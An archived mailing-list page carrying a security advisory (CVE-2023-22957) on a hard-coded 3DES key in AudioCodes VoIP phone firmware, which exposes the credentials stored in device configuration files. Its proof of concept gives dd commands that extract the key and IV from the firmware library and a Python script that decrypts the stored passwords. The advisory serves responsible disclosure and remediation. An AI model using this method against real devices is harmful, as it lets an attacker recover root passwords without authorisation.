<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="Use of Hard-coded Cryptographic Key (CWE-321) / CVE-2023-22957"/>
<meta name="Author" content="Moritz Abrell via Fulldisclosure"/>
<title>Full Disclosure: Use of Hard-coded Cryptographic Key (CWE-321) / CVE-2023-22957</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="14"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#15">By Date</a>
<a href="16"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="14"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#15">By Thread</a>
<a href="16"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">Use of Hard-coded Cryptographic Key (CWE-321) / CVE-2023-22957</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Moritz Abrell via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Fri, 11 Aug 2023 12:46:43 -0700<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Advisory ID:               SYSS-2022-052
Product:                   AudioCodes VoIP Phones
Manufacturer:              AudioCodes Ltd.
Affected Version(s):       Firmware Versions &gt;= 3.4.8.M4
Tested Version(s):         Firmware Version 3.4.4.1000
Vulnerability Type:        Use of Hard-coded Cryptographic Key (CWE-321)
Risk Level:                Medium
Solution Status:           Open
Manufacturer Notification: 2022-11-11
Solution Date:             N.A.
Public Disclosure:         2023-08-10
CVE Reference:             CVE-2023-22957
Author of Advisory:        Moritz Abrell, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

AudioCodes VoIP phones are modern desk phones which are used for the
operation in enterprise environments.

The manufacturer describes the product as follows (see [1]):

&quot;The AudioCodes 400HD series of IP phones is a range of easy-to-use,
feature-rich desktop devices for the service provider hosted services,
enterprise IP telephony and contact center markets. Based on the same
advanced, field-proven underlying technology as our other VoIP products,
AudioCodes high quality IP phones enable systems integrators and end
customers to build end-to-end VoIP solutions.&quot;


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The AudioCodes VoIP phones store sensitive information, e.g. credentials
and passwords, in encrypted form in their configuration files.
These encrypted values can also be automatically configured, e.g. via
the &quot;One Voice Operation Center&quot; or other central device management solutions.

Due to the use of a hardcoded cryptographic key, an attacker with
access to these configuration files is able to decrypt the encrypted
values and retrieve sensitive information, e.g. the device root password.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

By analyzing the shared library &quot;libac_des3.so&quot; of an AudioCodes IP phone
firmware in a disassembler and decompiler, e.g. Ghidra, the encryption
mechanism could be reversed and the hardcoded cryptographic key could be
extracted.

Used encryption algorithm: Triple DES in CBC mode
Memory address of the 24-byte 3DES key in the library: 00000fb8
Memory address of the 8-byte 3DES IV: 00000fb0

Extracting the key:
    #&gt; offset=$(python3 -c &apos;print(int(&quot;00000fb8&quot;, base=16))&apos;)
    #&gt; dd skip=$offset count=24 if=libac_des3.so of=key.bin bs=1

Extracting the IV:
    #&gt; offset=$(python3 -c &apos;print(int(&quot;00000fb0&quot;, base=16))&apos;)
    #&gt; dd skip=$offset count=8 if=libac_des3.so of=iv.bin bs=1


The following proof-of-concept Python script can be used for decryption:

  import sys
  import base64
  from Crypto.Cipher import DES3
  from binascii import unhexlify
</pre><tt>  
</tt><tt>  coded_string = sys.argv[1]
</tt><tt>  
</tt><tt>  ciphertext = base64.b64decode(coded_string)
</tt><tt>  
</tt><tt>  print(&quot;cipher text: &quot; + str(hexlify(ciphertext)))
</tt><tt>        
</tt><tt>  cipher = DES3.new(
</tt><pre style="margin: 0em;">
      unhexlify(&apos;604075fb509b8269[...]&apos;),
      DES3.MODE_CBC,
      iv=unhexlify(&apos;a3a47c5b[...]&apos;)
  )
</pre><tt>  
</tt><tt>  plaintext = cipher.decrypt(ciphertext)
</tt><tt>  
</tt><tt>  print(&quot;plain text: &quot; + str(plaintext.decode(&apos;utf-8&apos;)))
</tt><pre style="margin: 0em;">


Execution of the proof-of-concept script:
    #&gt; python decrypt.py kUqyNmIT1cDyBwGTu6J1Dw==
</pre><tt>    
</tt><tt>    cipher text: b&apos;914ab2366213d5c0f2070193bba2750f&apos;
</tt><pre style="margin: 0em;">
    plain text: S3cr3tP455w0rd

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Update devices to firmware version 3.4.8.M4 and define an individual and
strong secret from which the encryption key is derived.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2022-11-03: Vulnerability discovered
2022-11-11: Vulnerability reported to manufacturer
2022-12-12: Vulnerability confirmed by AudioCodes Ltd.
2023-01-19: AudioCodes Ltd. adapts the documentation so that it no
            longer states that the passwords are encrypted but obfuscated
2023-07-13: AudioCodes Ltd. informs that the upcoming release 3.4.8.M4
            will include a feature that allows setting a custom password
            from which the key will be derived
2023-08-10: Public disclosure at BlackHat USA[5]
2023-08-11: Public disclosure at<a  rel="nofollow" href="https://blog.syss.com[6">https://blog.syss.com[6</a>]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] AudioCodes IP Phones Product Website
    <a  rel="nofollow" href="https://www.audiocodes.com/solutions-products/products/ip-phones">https://www.audiocodes.com/solutions-products/products/ip-phones</a>
[2] AudioCodes One Voice Operation Center User&apos;s Manual
    <a  rel="nofollow" href="https://www.audiocodes.com/media/15928/one-voice-operations-center-users-manual-ver-80.pdf">https://www.audiocodes.com/media/15928/one-voice-operations-center-users-manual-ver-80.pdf</a>
[3] SySS Security Advisory SYSS-2022-052
    <a  rel="nofollow" href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2022-052.txt">https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2022-052.txt</a>
[4] SySS Responsible Disclosure Policy
    <a  rel="nofollow" href="https://www.syss.de/en/responsible-disclosure-policy">https://www.syss.de/en/responsible-disclosure-policy</a>
[5] BlackHat USA Briefings Session
    
<a  rel="nofollow" href="https://www.blackhat.com/us-23/briefings/schedule/#zero-touch-pwn-abusing-zooms-zero-touch-provisioning-for-remote-attacks-on-desk-phones-31341">https://www.blackhat.com/us-23/briefings/schedule/#zero-touch-pwn-abusing-zooms-zero-touch-provisioning-for-remote-attacks-on-desk-phones-31341</a>
[6] Detailed Blog Post
    <a  rel="nofollow" href="https://blog.syss.com/posts/zero-touch-pwn/">https://blog.syss.com/posts/zero-touch-pwn/</a>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Moritz Abrell of SySS GmbH.

E-Mail:moritz.abrell () syss de
Public Key:<a  rel="nofollow" href="https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Abrell.asc">https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Abrell.asc</a>
Key Fingerprint: 2927 7EB6 1A20 0679 79E9  87E6 AE0C 9BF8 F134 8B53

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided &quot;as is&quot;
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL:<a  rel="nofollow" href="http://creativecommons.org/licenses/by/3.0/deed.en">http://creativecommons.org/licenses/by/3.0/deed.en</a>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEKSd+thogBnl56Yfmrgyb+PE0i1MFAmS30TAACgkQrgyb+PE0
i1N8GxAApaOTpxCxcZEf1CMXW3IHbOcmK1v2gFTA/MYUMKgfFT/UG6O+GeAaEWzZ
vLkKlgxiEasllTplNr0TigNxIWIeQWTM57uIW8KeBOYMUwtYVkx0kr5NinnAjjyP
mLgn+8A9JJsqX/gr53p5Km8cyzgxNBWWHOWeS88wb/55jjOsBY/YAohEhKY7c9sM
zPj257Xij99D3hsaGYPVh1ZeaVab20h7fea5aIC1DqtEiadlgsj9MuLMVA4lCS0J
7Cv+/7KFgyujhYcy1pgQwXutSSp8hKHZGmIV2uOjm77ymVmBhX0zRG8hAX21BQBw
ExJM5fNRD17yI+6zun+7t37Fz0yTJ3YcIGC8ZECWHijkuLJG6yqowhk1Rsn2mATH
CndgGxe8qXjAPFuiZyUI+s1rfXu3iRVKaDaA0xpO/hVWFxBVqjR0awKEbU7oC5Zp
uzsun0kuhDuJ2WXeYWnSywZLXlqTPQhFTBEIapyAUiZMpoCKgDZYxCv/GeolsA1u
lfV631ryBPMZ/f6LjxDgqKGQoQCSISXjg4Bt6Ug587yhc0MMYvHequ/v5LeRpSoC
umtwSZHPdeXZC8/uhfH4K7ad62q/6BQMZyObF3gUIrwWXWUM2ow1UXN9T7Wsw0+j
n82nbE/ymMGyJvcE+cApLPlzmQuHOOdAX4EBLVDAiBQCVfIMjbM=
=uvQN
-----END PGP SIGNATURE-----
</pre><p><strong>Attachment:
<a href="att-15/smime_p7s.bin" ><tt>smime.p7s</tt></a></strong><br>
<em>Description:</em> S/MIME Cryptographic Signature</p>
<pre style="margin: 0em;">_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a></pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="14"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#15">By Date</a>
<a href="16"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="14"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#15">By Thread</a>
<a href="16"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>Use of Hard-coded Cryptographic Key (CWE-321) / CVE-2023-22957</strong> <em>Moritz Abrell via Fulldisclosure (Aug 15)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

